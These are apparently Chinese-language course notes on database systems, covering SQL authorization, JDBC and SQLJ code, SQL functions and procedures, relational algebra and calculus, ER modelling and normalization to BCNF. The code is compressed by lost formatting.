将对关系instructor的select权限授予用户U1U2U3&gt; grant select on instructor to User1,User2,User3&gt; revoke语句用于收回权限 12revoke &lt;权限列表&gt;on &lt;关系名|视图名&gt; from &lt;用户|角色列表&gt; &lt;权限列表&gt;可以是all，表示收回被收回人持有的所有权限 如果 包含public的话，则除了显式地被授予权限的用户外，所有的用户将失去权限 如果同意权限由不同授权人两次授予同一用户，用户在一次权限被回收后，仍保持有权限 收回权限时，若该用户已将权限授予其他用户，也一并收回 角色12345678create role instructorgrant instructor to Amit# 角色可以被授以权限grant select on takes to instructor# 角色可以授以用户，也可以被授以其他角色create role teaching_assistantgrant teaching_assistant to instructor# instructor 继承teaching_assistant的所有权限 角色链 123create role deangrant instructor to deangrant dean to Satoshi 视图的权限123456create view geo_instructor as (4select * from instructor where dept_name = &apos;Geology&apos;)grant select on geo_instructor to geo_staff references权限创造外码 1grant references (dept_name) on department to Mariano 权限的转移：with grant option 授予其权限并允许用户可以将此权限授予其他用户 1grant select on table_name to Alice with grant option 高级SQL使用程序设计语言访问数据库 动态SQL JDBC和ODBC 嵌入式SQL API（Application-program interface）用于程序和数据库服务器之间的交互 应用程序调用：①与数据库服务器连接；②向数据库服务器发送SQL命令；③逐个取结果元组到程序变量 ODBC（Open Database Connectivity）：用于C，C++，C#和Visual Basic JDBC（JAVA Database Connective）：用于Java JDBCJDBC是一个支持SQL的Java API，用于与数据库系统通信 JDBC支持查询和更新数据、检索查询结果等多种功能 JDBC也支持元数据检索，例如查询当前数据库中的关系、关系属性的名字和类型 与数据库的通信模型 打开一个连接 创建一个statement对象 使用statement对象执行查询，发送查询并取回结果 处理错误的异常处理机制 JDBC的基本工作步骤如下： 123456789101112131415161718192021222324252627282930313233343536373839404142public static void JDBCExample(String dbid,String userid,String passwd)&#123; try&#123; //1.Load the JDBC driver class Class.forName("oracle.jdbc.driver.OracleDriver"); //2.Open a database connection // jdbc:database_type:mode:URI // database_type = [mysql,oracle,...] // oracle:URI: @URI // mysql:URI: //URI Connection conn = DriverManager.getConnection( "jdbc:oracle:thin:@URI", userid, passwd); //3.Issue SQL statements Statement stmt = conn.createStatement(); /* * 4.Process result set * Do Actual Work */ stmt.close(); conn.close(); &#125;catch (SQLException sqle)&#123; System.out.println("SQLException: " + sqle); &#125; &#125;------------------------------------------------------------------//Actual Work//updatestmt.executeUpdate("insert into instructor values('" + a1 + "', 'Kim','Physics',98000)");//queryResult rset = stmt.executeQuery("Select dept_name ,avg(salary) from instructor group by dept_name");while(rset.next())&#123; System.out.println(rset.getString("dept_name") + "\t" + rset.getFloat(2));&#125;//nullrset.wasNull() = true; JDBC：立即执行VS预备语句 立即执行 使用Statement类，将SQL语句直接交给DBMS执行 一次语句执行DBMS进行一次语句编译 使用预备语句执行 使用PreparedStatement类，SQL语句执行，首先进行编译，编译结果赋予PreparedStatement的对象 预编译的结果可被反复多次执行 同嵌入SQL预编译不同（在编译程序时进行），JDBC的预编译时在程序运行中进行的 一个SQL多次执行 使用预备语句，仅编译一次 立即执行的模式下，需多次编译 在一SQL多次执行时，使用预备语句比立即执行的 12345678910// 预备语句PreparedStatement pStmt = conn.prepareStatement(4"insert into instructor values(?,?,?,?)");pStmt.setString(1,"88888");pStmt.setString(2,"Alice");pStmt.setString(3,"Finance");pStmt.setInt(4,1250000);pStmt.executeUpdate();pStmt.setString(1,"88888");pStmt.executeUpdate(); 对于查询，使用pStmt.executeQuery()，返回一个结果集（ResultSet） 将一个来自用户的输入添加到查询时，使用预备语句比较好 SQL语句的预编译能够有效防止SQL注入 元数据特性ResultSet：元数据：描述数据的数据 123456ResultSet rs;//执行完查询后得到的结果ResultSetMetaData rsmd = rs。getMetaData();for(int i = 1;i&lt;=rsmd.getColumnCount();i++)&#123; System.out.println(rsmd.getColumnName(i)); System.out.println(rsmd.getColumnTypeName(i));&#125; 如上，就是用java代码获取元数据的代码 查询结果的元数据：①对描述查询结果集的属性类型（结果集的模式）；②对编程时不能确定的结果集模式时非常有用 123456789DatabaseMetaData dbmd = conn.getMetaData();4ResultSet rs = dbmd.getColumns(null, "univdb", "department", "%");4// Arguments to getColumns: Catalog, Schema-pattern, Table-pattern,4// and Column-Pattern4// Returns: One row for each column; row has a number of attributes4// such as COLUMN_NAME, TYPE_NAMEwhile(rs.next()) &#123; System.out.println(rs.getString("COLUMN_NAME"),rs.getString("TYPE_NAME"));&#125; DatabaseMetaData类：JDBC的一个类，对DB数据字典进行封装，类方法可以读取数据字典元数据，屏蔽了数据字典的具体实现模式，对应用提供了访问DB数据字典元数据的标准方法 JDBC的事务控制在默认情况下，每个SQL语句都被作为一个被自动提交的独立的事务 对于有多个更新的事务，这种做法并不好 可以通过代码关闭自动提交：conn.setAutoCommit(false); 事务必须被显式的提交或回滚：conn.commit();或conn.rollback(); 打开自动提交：conn.setAutoCommit(true); 调用函数和过程12CallableStatement cStmt1 = conn.prepareCall("&#123;? = call some function(?)&#125;");CallableStatement cStmt2 = conn.prepareCall("&#123;call some procedure(?,?)&#125;"); 处理大型对象类型getBlob()和getClob()与getString()方法类似，但是分别返回Blob和Clob对象 通过getBytes()从这些对象里得到数据 将一个开放的流域Java Blob或Clob对象相连，来更新大对象 1blob.setBlob(int parameterIndex, InputStream inputStream); SQLJ由于JDBC的动态化，编译器无法捕捉其错误，因此有SQLJ SQLJ：在java中的嵌入式SQL 12345678910#sql iterator deptInfoIter ( String dept name, int avgSal);deptInfoIter iter = null;#sql iter = &#123; select dept_name, avg(salary) from instructor group by dept name &#125;;while (iter.next()) &#123;4String deptName = iter.dept_name();4int avgSal = iter.avgSal();4System.out.println(deptName + " " + avgSal);&#125;iter.close(); ODBC ODBC结构如上图 ODBC：Open Database Connectivity标准： 应用程序与数据库服务器通信标准 应用程序接口 与数据库建立一个连接 发送查询和更新数据库的语句 取回结果 （略） 嵌入式SQLSQL标准定义了许多语言的嵌入式SQL，如C，JAVA，Cobol SQL查询所嵌入的语言被称为宿主语言（host language），宿主语言中使用的SQL结构被称为嵌入式SQL 这些语言的基本形式遵循System R的嵌入到PL/I的SQL的形式 （略） 函数和过程和结构SQL：1999支持函数和过程 函数/过程可以用SQL自身写，也可以用外部编程语言写 函数对专门的数据类型，如图像和几何对象特别有用 许多数据库系统支持表值函数（table-valued functions），表值函数会返回一个关系作为结果 SQL：1999支持许多命令式结构，包括循环（loops）、if-then-else、赋值（assignment） 123456789101112131415# 定义一个函数,输入一个系的名字,返回该系的教师数量create function dept_count(dept_name varchar(20))4returns integer4begin44declare d_count integer;44select count(*) into d_count44from instructor44where instructor.dept_name = dept_name44return d_count;4end4# 找出教师数大于12的所有系的名称和预算select dept_name,budgetfrom departmentwhere dept_count(dept_name) &gt; 12 SQL：2003增加了返回关系作为结果的函数 1234567891011121314# 返回一个包含特定系的所有教师的表create function instructors_of (dept_name char(20))4returns table (ID varchar(5), name varchar(20), dept_name varchar(20), salary numeric(8,2))return table (select ID,name,dept_name,salary from instructor where instructor.dept_name = instructors_of.dept_name)#useselect * from table (instructs_or(&apos;Music&apos;)) dept_count函数也可以写成一个过程 1234567891011create procedure dept_count_proc (in dept_name varchar(20), out d_count integer)begin4 select count(*) into d_count4 from instructor4 where instructor.dept_name = dept_count_proc.dept_nameend# 可以在一个SQL过程中或者嵌入式SQL中使用call语句调用过程declare d_count integer;call dept_count_proc(&apos;Physics&apos;,d_count); 过程和函数可以通过动态SQL触发 SQL:1999：允许使用多个同名过程/函数（称为名字重载），只要参数的个数不同，或对于那些有相同参数个数的函数，至少有一个参数的类型不同 触发器（略） 形式化关系查询语言关系代数 关系代数 六种基本运算符 选择（Select）：σ 投影（Project）：Π 并（union）：∪ 集合差（set difference）：- 笛卡儿积（Cartesian product）：× 更名（rename）：ρ 关系代数的运算以一个或两个关系作为输入，产生一个新的关系作为结果 选择运算 记法：σp(r) p被称为选择谓词 定义为： σp(r) = { t | t ∈ r and p(t) }，其中p是一个命题演算公式，由连词（∧(and)，∨(or)， ┐(not)）把项连接起来构成每一个项（term）的形式可以为：&lt;attribute&gt; op &lt;attribute&gt; or &lt;constant&gt; ，其中op可以是：=，≠，&gt;，≥，&lt;，≤ 示例：σ dept_name = “Physics”(instructor) 选择运算是从行的角度进行的运算 投影运算 记法：ΠA1,A2,…,Ak(r) ，其中A1,A2,…,Ak 是属性名，r是关系名 结果由选择的k列组成，删除了没有被选择的其他列 因为关系是集合，所以重复的元组从结果中删除 示例：ΠID, name, salary(instructor) 投影操作主要是从列的角度进行运算 并运算 记法：r ∪ s 定义为：r ∪ s = { t | t ∈ r or t ∈ s } 要使并运算r∪s有意义 r，s必须是同元的（属性数目必须相同） 属性的域必须相容（如r的第二列的属性类型必须和s的第二列类型相同） 示例：找出开设在2009年秋季学期或者2010年春季学期或者这二者皆开的所有的课程： Πcourse_id (σ semester = “Fall” Λ year=2009 (section) ) ∪Πcourse_id (σ semester=“Spring” Λ year=2010 (section) ) 集合差运算 记法：r - s 定义为：r - s = { t | t ∈ r and t ∉ s } 必须保证集合差运算在相容的关系间进行 r 和 s必须是同元的 r 和 s属性的域必须相容 示例：找出开设在2009年秋季学期但是在2010年春季学期不开的课程：Πcourse_id (σ semester = “Fall” Λ year=2009 (section) ) -Πcourse_id (σ semester=“Spring” Λ year=2010 (section) ) 基本运算的分配律 投影和并可以分配 Πpid,name(S∪T) ≡ Πpid,name(S) ∪ Πpid,name(T) 投影和差不可分配 笛卡儿积运算 记法：r × s 定义为：r × s = { tq | t ∈ r and q∈ s } 元组的连串（Concatenation）：若r = (r1,..,rn)，s = (s1,…,sm)，则定义r与s的连串为一个n+m的元组，记作rs = (r1,…,rn,s1,s…,sm) 假设关系r(R)和s(S)的属性不相交（即R ∩ S = Φ ） 如果关系r(R)和s(S)的属性有相交的，则必须使用更名运算 示例： 运算的组合 如图为一个例子 更名运算 允许通过更名来引用关系代数表达式的结果 允许引用一个关系时使用多于一个的名字 如： ρX(E) ：返回更名为X的表达式E的结果 如果关系代数表达式E时n元的，则 ρ χ(A1,A2,…,An)(E) ，返回被更名为X的表达式E的结果，并且属性被更名为A1，A2，…，An 关系代数表达式嵌套 关系代数中基本的表达式是如下二者之一： 数据库中的一个关系 一个常数关系 n设E1 和E2是关系代数表达式，则以下这些都是关系代数表达式： E1 ∪ E2 E1 – E2 E1 x E2 σp (E1), 其中P是E1的属性上的谓词 Πs(E1),其中S 是E1中某些属性的列表 ρx (E1),其中x 是E1结果的新名字 附加关系代数运算 附加运输没有实质地扩展关系代数的能力，但是简化了查询的书写 集合交 自然连接 赋值 外连接 #### 集合交运算 记法：r ∩ s 定义为： r ∩ s = { t | t ∈ r and t ∈ s } r 和 s 是同元的 r 和 s 属性域相容 注： r ∩ s = r - ( r - s ) = s - ( s - r ) θ连接定义： 所以，θ连接是做笛卡儿积，然后筛选出符合AθB表达式的元组作为结果返回 自然连接运算 记法：r ⋈ s 定义：关系 r 和 s 分别是模式 R 和 S 的关系，则 r ⋈ s 是由如下方式得到的模式 R ∪ S 的关系 对于 r 中的每个元组 tr 和 s 中的每个元组 ts 所组成的元组对 如果 tr 和 ts 在 R ∩ S的属性上有相同的值，则在结果中加入一个元组t，并且： t 在r上和 tr 有相同的值 t 在s上和 ts 有相同的值 示例：若R = (A,B,C,D) ，S = (E,B,D) ，结果模式 = (A,B,C,D,E) ，则 r ⋈ s =Πr.A, r.B, r.C, r.D, s.E ( σ r.B = s.B Λ r.D = s.D (r × s ) ) 自然连接和等值连接的不同 自然连接中相等的分量必须是相同的属性组，并且要在结果中去掉重复的属性，二等值连接则不必 当 R 与 S 无相同属性时， R ⋈ S = R × S 可交换，可结合 s ⋈ sc ≡ sc ⋈ s ( s ⋈ sc ) ⋈ c ≡ s ⋈ ( sc ⋈ c ) 赋值运算 赋值运算（⬅）提供了一种简化关系代数表达式书写的方式 把查询表达为一个顺序程序，由以下构成 一系列赋值 一个其值被作为查询结果显示的表达式 赋值必须是赋给一个临时关系变量 外连接 外连接运算是连接运算的扩展，可以处理缺失的信息 计算连接，然后一个关系中失配的元组添加到结果中 使用空值（null）： null代表一个值未知或不存在 所有的包含null比较运算都被定义为false 示例： 现有关系如下图： 有连接、左外连接、右外连接、全外连接如下： 连接即将表做笛卡儿积，筛选出相同属性拥有相同值的元组，将其连接起来成为一个新的元组 左外连接即保证左表的主码完整性，右外连接保证右表的主码完整性 全外连接保证全部数据的不被舍弃 均用空值null填补空白的属性 外连接运算可以用基本关系代数表示 空值 元组的一些属性可以为空值，用null表示 null代表一个值未知或不存在，空值是一种状态，不是一个明确的值 含有null的算数表达式的结果为null 聚集函数直接忽略空值（比如在SQL里） 在去重和分组运算中，null和其他值一样，两个null被看作是相同的值 含有空值的比较运算的结果是一个特殊的值：unknown 如果用 false 取代 unknown，那么 not (A &lt; 5) 和 A &gt;= 5不等价 使用unknown的三值逻辑 or：(unknown or true) = true，(unknown or false) = unknown，(unknown or unknown) = unknown and：(unknown and true) = unknown，(unknown and false) = falses，(unknown and unknown) = unknown not：not unknown = unknown 在SQL中，若谓词P的值为unknown，则P is unknown = true 选择（select）谓词的结果如果是unknown，则相当于false 除运算 定义：给定两个关系 r(R) 和 s(S) ，并且 S ⊂ R，则 r ÷ s 是满足 t × s ⊆ r 的最大关系t(R-S) 可以将 r ÷ s 写为：temp1 ⬅ ΠR-S(r) ，temp2 ⬅ ΠR-S( (temp1 × s) - ΠR-S, S(r) ) ，result = temp1 - temp2 示例： r÷s给出的学生ID选了Biology系卡的所有课r(ID, course_id) = Π ID, course_id(takes) 且 s(course_id) = Πcourse_id(σdept_name = “Boilogy” (course)) 扩展的关系代数运算 广义投影 聚集函数 广义投影 定义：ΠF1,F2,…,Fn(E) ，E是任意关系代数表达式，Fi是涉及常量以及E的模式种属性的算术表达式 广义投影运算允许在投影列表中使用算术函数来对投影进行扩展 示例：给定关系 instructor(ID, name, dept_name, salary) 其中salary 是年薪， 可以得到每个教师的ID、name、dept_name及每月的工资： ΠID, name, dept_name, salary/12(instructor) 聚集函数 聚集函数：输入值的一个汇集，将单一值作为结果返回 avg：平均值 min：最小值 max：最大值 sum：求和 count：计数 示例： 聚集的结果没有名称 可以使用更名运算给他命名 为方便起见，我们允许把更名作为聚集运算的一部分 多重关系代数 纯关系代数删除所有的重复 多重集关系代数保存重复，为了匹配SQL的语义 多重集关系代数定义为： 选择：和输入关系中的满足选择条件的元组个数一样多 投影：每个输入元组产生一个元组，即使有重复也保留 叉积：如果关系 r 的元组 t1 有m个副本，关系s 的元组 t2 有 n**个副本，则关系r x s的元组t1.t2有m x n个副本 类似的，其他的操作为 示例：并：m + n个副本，交：min(m, n)个副本，差：min(0, m – n)个副本 具体可以见SQL的多重关系运算==&gt; #集合运算与重复 元组关系演算 元组关系演算是非过程化的查询语言，查询表达式的形式为：{ t | P(t) } 表示它是所有使谓词P为真的元组 t 的集合 t 为元组变量，t[A] 表示元组 t 在属性A上的值 t ∈ r 表示元组 t 在关系 r 中 P是一个类似于谓词演算的公式，由原子公式和运算符组成 原子公式 s ∈ R：s是关系R中的一个元组 s[x] θ u[y] ：s[x]与u[y] 为元组分量，他们之间满足比较关系θ s[x] θ c：分量s[x]与常量c之间满足比较关系θ 公示的递归定义 原子公式是公式 如果P是公式，那么 ﹁P 和 (P) 也是公式 如果P1、P2是公式，则 P1 ∧ P2， P1 ∨ P2 ，P1 &rArr; P2也是公式 如果P(t) 是公式，R是关系， 则 ∃ t ∈ R (P(t)) 和 ∀ t ∈ R (P(t)) 也是公式 谓词演算公式： 属性和常量的集合 比较运算符的集合（&lt;，≤，=，≠，&gt;，≥） 连词的集合（and，or，not） 蕴含（&rArr; ）： x &rArr; y，如果x为真，则y也为真。 x &rArr; y ≡ ﹁ x &or; y 量词的集合：∃ 和 ∀ 表达式的安全性 元组关系演算表达式可能产生一个无线的关系 为了避免产生无限关系，我们将限制所允许的表达式集合为安全表达式 元组关系演算与关系代数的等价性 投影： ΠA(R) = { t | ∃s ∈ R，(t[A] = s[A]) } 选择： σF(A)(R) = { t | t ∈ R ∧ F(t[A]) } 广义笛卡尔积： R(A) × S(B) = { t | ∃u∈R, ∃s∈S ，( t[A] = u[A] ∪ t[B] = s[B])} 并： R ∪ S = { t | t ∈ R &or; t ∈ S } 差： R - S = { t | t ∈ R &and; ﹁ t ∈ S } 数据库设计与ER模型设计模型概览数据库设计 工程性 有基本的对错问题 不能简单的以对/错论述问题 不同的工程方法可以达到工程目的 对错概念被弱化 强调优劣好坏 好优的工程可以以较小代价，取得较好/高的成果 强调多数人的看法和评价 软件生命周期瀑布模型如下图 需求分析的目标、内容和结果 需求分析的目标 澄清用户需求 为系统设计和实现奠定基础 需求分析的内容 数据分析：包括数据结构、关系、约束、语义等等 加工逻辑分析：对数据如何进行加工、处理、变换 流程分析：动作间的先后次序，以及相互关系 其他：界面要求、性能需求 需求分析的结果 用户需求规格说明书（简称需求说明书） 实体-联系模型实体联系模型（Entity Relationship Diagram），简称ER图 ER图的位置 数据分析、描述的工具 数据分析、描述以E-R图为主 需要其他文档辅助 ER图的作用 帮助澄清用户数据需求，分析员和用户对数据需求达成高度一致 数据逻辑模型设计的基础 ER图的要求和评价标准 清晰、易懂 完整、精确、无二义 需要关注的主要缺陷 冗余 不完整 一个数据库可以建模成①一组实体集；②多个实体间的相互关联 实体是现实世界中可区别于所有其他对象的一个“事务”或“对象” 实体具有属性 一个实体集是相同类型即具有相同性质（或属性）的一个实体集合 联系集是相同类型联系的集合 联系集是 n ≥ 2 个（可能相同的）实体集上的数学联系。如果E1，E2，…，En是实体集，那么联系集 R 是 { (e1,e2,…,en) | ei ∈ Ei } 联系也可以具有描述性属性 例如，考虑实体集 instructor 和 student 之间的联系集 advisor 。 我们可以将属性 date 与该联系关联起来，以表示教师成为学生的导师的日期。 联系集的度二元联系集：涉及两个实体集（或说度为2）；数据库系统中的大部分联系集都是二元的。 属性实体通过一组属性来表示，属性是实体集中每个成员所拥有的描述性性质 域：每个属性都有一个可取值的集合 属性类型 简单（Simple） and 复合（Composite）属性 单值（Single-valued） and 多值（Multivalued）属性 派生（Derived）属性 如下图，address就是一个复合属性 约束 映射基数 表示一个实体通过一个联系集能关联的实体的个数 在描述二元联系集时非常有用 对于实体集A和B之间的二元联系集R来说，映射基数必然是以下情况之一 一对一（One to one） 一对多（One to many） 多对一（Many to one） 多对多（Many to many） 参与参与：Participation：实体集之间的关联称为参与，即实体参与联系 码实体集的超码是一个或多个属性的集合，这些属性的值可以是我们唯一地标识一个实体 实体集的候选码是一个最小的超码 虽然可能存在多个候选码，只有一个候选码能被选为主码 ==&gt;详细定义可见 码的定义 联系集的码：参与实体集合的主键组合形成联系集的超码 NOTE：这意味着一对实体在特定联系集中至多有一个关系 决定候选码的时候必须考虑联系集的映射基数 在选择主键的时候要考虑联系集的语义信息以防有多个候选码 冗余属性12345678# 例假设我们拥有实体集instructor (具有属性 dept_name),department和一个关系inst_dept 联系 instructor 和 department实体 instructor 中属性 dept_name 是冗余的，因为有明确的关系inst_dept 联系instructors 和 departments属性dept_name 在两个实体集中都出现了，他在实体集 instructor 中是冗余的，需要将其移除。BUT: when converting back to tables, in some cases the attribute gets reintroduced, as we will see. 实体-联系图 分成两部分的矩形代表实体集 菱形代表联系集 属性在实体集矩形中列出 构成主码的属性用下划线标明 若联系集拥有属性，则用虚线引出一个矩形，在矩形中标明属性 角色一个关系的实体集必须是互异的，实体在联系中扮演的功能称为实体的角色 如图，标签course_id和prereq_id被称作角色 基数约束我们在所讨论的联系集和实体集之间画一个箭头（→）或一条线段（—）来表示基数约束 一对一关系 如图，instructor 和 student 之间的一对一关系通过 advisor一名教师至多指导一名学生通过 advisor一名学生至多可以有一位导师。 一对多关系 instructor 和 student 之间的一对多关系通过 advisor一名教师可以指导多名学生（包含0名）通过 advisor一名学生至多可以有一位导师 多对一关系 instructor 和 student 的多对一关系通过 advisor一名教师可以指导至多一名学生通过 advisor一名学生可以有多名导师(包括0名) 多对多关系 通过 advisor一名教师可以指导多名学生通过 advisor一名学生可以有多位导师 带有箭头的线表示只对应一个，没有箭头的线代表可以有多个对应 全部参与全部参与（用双线表示）：实体集中的每个实体在联系集中至少参与了一个关系 如图，每个section（部门）都必须有一个相关的课程 基数限制的可选标记 上下界约束：A1，A2，…，An之间的多元联系，Ak端的基数约束L..H表示：对来自{A1,A2…,Ak-1,Ak+1,…,An}集合的每个实体组，至少和L个、至多和H个来自Ak的实体关联 (该说法与教材相反) 弱实体集 没有足够的属性以形成主码的实体集称作弱实体集 弱实体集存在依赖于标识实体集 标识性联系是从弱实体集到标识实体集多对一的，并且弱实体集在练习中的参与是全部的 标识性联系以双菱形表示 弱实体集的分辨符是使得我们可以区分依赖于特定强实体集的弱实体集中的实体的属性的集合 弱实体集的主码是有标识实体集的主码加上该弱实体集的分辨符构成的 弱实体集的分辨符以虚下划线标明，而不是实线 关联弱实体集和标识性强实体集的联系集以双菱形标识 示例如下，Section的主键（course_id，sec_id，semester，year） 转化为关系模式 根据ER模型建立数据库模式的步骤 ER图转换为表进行必要的合并 本步可以按照机械方法完成 一个良好的ER图，完成本步转换和合并得到的结果，已经是比较理想的数据库模式 优化 本步无具体可行的机械方法 主要依靠设计人员的经验和能力 在数据库设计中，对于每个实体集和每个联系集，都有唯一的关系模式与之对应 可以将一个符合ER数据库模式的数据库表示为一些关系模式的集合 关系模式名即为相应地实体集或联系集的名称 每个模式有几列（类似于属性），每列有唯一的名字 具有简单属性的实体集的表示 用具有n个不同属性的模式E来表示强实体集 用包含标识性强实体集的主键作为列构成的表来表示实体集 多对多联系集表示为两个参与实体集主键属性和联系集中任何描述属性所组成的模式 模式的冗余多对一和一对多联系集中全部参与的many一方可以通过增加额外的属性来表示，包含one一方的主键 对于一对一联系集，任意一边都可以作为many一方 额外的属性可以加到类似于两个实体集的任一个表中 若many一方是部分参与，利用many一方生成额外属性会导致存在空值 连接弱实体集与其依赖的强实体集的联系集的模式是冗余的 复合多值属性 复合属性可以在划分为更小的部分（即其他属性） 实体E的多值属性M用一个单独的关系模式EM标识 关系模式EM有和E的主键相关的属性，有一个和多值属性M相关的属性 多值属性的每个值和关系模式EM中的每个分离的元组相匹配 模式优化 关系模式设计方案的评价标准 数据表示符合自然结构 清晰、简洁、易于理解 数据冗余小 数据访问效率高 结构易于扩展 。。。 关系模式的设计 设计方案的评价标准中，指标相互之间存在的矛盾 设计是在矛盾的指标中，评价选择最合适的方案 工程思想和方法、设计人员的经验和能力，对模式设计都是重要的 E-R图转换为表 vs 模式优化设计 一个良好的ER图，转换为表并进行必要的合并，得到的结果已经是比较理想的数据库模式 不排除还有人工进一步优化的余地 进一步的优化必须审慎，必须综合评价优化的优缺点 设计问题：用实体集还是属性集，用实体集还是联系集，二元还是n元联系集 扩展的E-R特性 特化 自顶而下设计过程：实体集可能包含一些子集，子集中的实体在某些方面区别于实体集中的其他实体 这些子集变为低层次的实体集，拥有不适用于高层次实体集的属性或一些部分参与的关系 在E-R图中，特化用从特化实体指向另一个实体的空心箭头来表示，我们成这种关系为ISA关系 属性继承：高层实体集的属性你可以被底层实体集继承。底层实体集（或子类）同时还继承地参与其高层实体（或超类）所参与的实体集 概化 自底而上的设计过程：多个实体集根据共同的特征给你综合成一个较高层的实体集 概化只不过是特化的逆过程，在ER图中，我们对概化和特化的表示不做区分 特化关系还可以形成超类：子类联系 特化/概化上的约束 实体可以是给定低层次实体集成员的约束 条件定义的 用户定义的 另一类约束涉及在一个概化中另一个实体是否可以属于多个低层实体集 不相交（Disjoint） 不相交约束要求一个实体至多属于一个低层实体集 Noted：在ER图中，通过连接在同一个矩形上的多个低层次实体集表示 重叠（overlapping） 同一个实体可以同时属于同一个概化中的多个低层实体集 完整性约束：定义高层实体集中的另一个实体是否必须至少属于该概化/特化的一个低层实体集 全部概化：每个高层实体必须属于一个低层实体集 部分概化：允许一些高层实体不属于任何低层实体集 通过模式表示特化： Method1 为高层实体集创建一个模式 每个低层实体集创建一个模式，模式中的属性包括对应低层实体集的每个属性，以及对应于高层实体集主码的每个属性 DrawBack：与低层关系模式有关的关系和与高层关系模式有关的关系 Method2 利用低层实体集的每个属性和对应于高层实体集的每个熟悉创建模式 如果特化是完全的，不需要存储概化实体集的信息(可以定义为包含特化关系并集的view，可能仍然需要显示的定义外键约束) Drawback：可能会存在冗余 数据库设计的其他方面 数据约束 识别约束、描述约束、在模式实际中实现约束 性能考虑 吞吐量，响应时间的需求分析与相关设计考虑 索引设计：索引对查询和更新效率的影响 授权 工作流 流程分析和设计是应用系统开发的重要环节 工作流管理系统（WFMS）是流程管理的重要平台 WFMS是一个专业领域，本身并不属于数据库领域 其他：考虑将来可能的变迁 关系数据库设计好的关系设计特点 RDB设计工程方法的代表：E-R图方法 绘制E-R图 E-R图 → RDB模式 模式优化 RDB设计工程方法的问题 E-R质量和分析员的能力水平相关 E-R质量难以保证，致使E-R方法设计质量难以保证 其他RDB模式工程设计方法存在类似的问题 质量保证 质量保证 vs 高质量 工程方法质量保证困难，受工程人员能力影响大 质量保证常用方法：机械化、形式化 关系模式规范化研究背景 为提高RDB设计质量保证，国外学者探寻和研究形式化的RDB设计方法 提出和完善了：关系模式规范化理论和方法 希望按照规范化理论和方法， 能够进行有质量保证的RDB设计 关系模式规范化的基本思路 泛关系：Universal Relation 数据间的约束 按照机械算法，得到好的关系模式 关系模式规范化理论和方法 模式规范化方法的研究状况 提出了模式规范化的标准：1NF，2NF，3NF，BCNF，4NF，5NF，6NF 给出了泛关系分解到具体范式的算法 算法多为NP算法，无法实际执行 规范化方法学习价值 理解不同范式的优缺点 理解相应的模式改进方法 作为重要指导思想指导模式设计 设计选择 更小的模式：连接不起来表——有损分解 更大的模式：信息重复 有损分解：分解范式之后，自然连接不能重构表 无损分解：分解之后，自然连接能重构表 好的关系模式 该大则大，该小则小 同数据本质结构相吻合 不必存储不必要的重复信息，同时又可以方便地获取信息 如何得到好的关系模式 工程化方法 模式规范化 原子域和第一范式 原子域：域元素被认为是不可分的单元，称域是原子的。 第一范式：称一个关系模式R属于第一范式，如果R的所有属性域都是原子的。 非原子值是的存储变复杂并且导致数据存贮的冗余 决定一个特定关系R是不是一个好的形式 若一个关系R不是好的形式，将他分解为一系列关系 {R1，R2，… ，Rn}，使得 每个关系是形式良好的 分解是无损的 基础理论： 函数依赖 多值依赖 函数依赖函数依赖是在合法关系集合上的约束，要求一个特定的属性集合的值唯一决定另一个属性集合的值 一个函数依赖是一个码标识的概化 考虑一个关系模式R， α ∈ R and β ∈ R ，函数依赖 α → β 满足的条件是对实例中所有元组对t1和t2，有 t1[α] = t2[α] ⟹ t1[β] = t2[β] 。如果R的每个合法实例r都满足函数依赖 α → β ，则我们说该函数依赖在模式R上成立。 如果函数依赖 K → R 在R上成立，则K是R的一个超码。 K是R的候选码当且仅当 ① K → R；② 不存在 α ⊂ K，α → R。 函数依赖的使用 利用函数依赖 判断关系的实例是否满足给定函数依赖集F 如果一个关系实例r在函数依赖集F下是合法的，那么r满足F 说明合法关系集上的约束 如果R上的所有合法关系都满足函数依赖集F，那么F在R上成立 Note：即使一个函数依赖在所有实例上不成立，他可能在某个特定的关系模式实例上成立例如，instructor上的一个特定实例，满足name → ID 有些函数依赖称为平凡的，因为他们在所有关系中满足： 一般的，如果 β ⊆ α ，α → β是平凡的 平凡的函数依赖 对所有的关系模式R，如果 β ⊆ α ，必有α → β 当 β ⊆ α 时，称 α → β 是平凡（trivial）的函数依赖 否则，称为 α → β 非平凡的函数依赖，称 α 是 β 的实质决定因素 对立关系模式R(sno, sname, dno, dname)，下述函数依赖成立： sno → sname，dno，dname sno，sname → dno dno → dname 函数依赖是对关系模式的约束 关系模式的表示：四元组 R（U，D，dom，F），F是R成立的函数依赖集合 关系模式简单表示为：R(F) 不成立的函数依赖 对关系模式R(sno, sname, dno, dname)，下述函数依赖不成立：sname → sno 函数依赖是对模式的约束 函数依赖必须是现实语义约束的反映 在一些具体的关系实例上，sname → sno成立 函数依赖与码 使用函数依赖码 超码SuperKey：对关系模式R， α ⊆ R，如果 α → R，则α为超码 候选码CandidateKey：对关系模式R，α为超码，如果任意α的真子集β，β → R 不成立，则称α 为候选码 例：对关系模式R(sno,sname,dno,dname)，下述函数依赖成立：①sno→R②sno,dno→R 实例满足的依赖 vs 模式上成立的依赖 关系模式R(F)，如果 r ∈ R(F)，则 R上成立的所有函数依赖，r必须满足；否则，称r ∉ R(F) r上满足的函数依赖，R上不一定成立 函数依赖集合的闭包给定函数依赖集F，必定有一些其他的函数依赖被F逻辑蕴含，例如：如果A→B且B→C，那么可推断A→C 能够从给定F集合推导出的所有函数依赖的集合称为F的闭包 使用F+ 符号来表示F集合的闭包 F+是F的一个超集 Boyce-Codd 范式具有函数依赖集F的关系模式R属于BCNF的条件是，对F+中所有形如 α → β 的函数依赖，下面至少有一项成立： α → β 是平凡的函数依赖（即 β ⊆ α） α 是模式R的一个超码 1NF是指数据库表的每一列都是不可分割的基本数据项，即实体中的某个属性不能有多个值或者不能有重复的属性。 2NF要求属性完全依赖于主键，不能存在仅依赖主关键字一部分的属性。 3NF要求每一个非主属性既不部分依赖于码也不传递依赖于码。 BCNF消除了主属性对候选码的部分和传递函数依赖。 1、第一范式（1NF）：一个关系模式R的所有属性都是不可分的基本数据项，原子的。 2、第二范式（2NF）：满足第一范式，然后消除部分依赖。 3、第三范式（3NF）： 满足第二范式，消除传递依赖。 BCNF的本质 （在只考虑函数依赖的前提上）只讲一件事 非码决定的那个因素的相关决定关系讲述了另外一件事 多个码是一件事的不同方面，本质上仍是一件事 所有的二元联系都是BCNF BCNF和保持依赖：关系模式可以通过分解达到BCNF DBMS检查函数依赖的开销很大 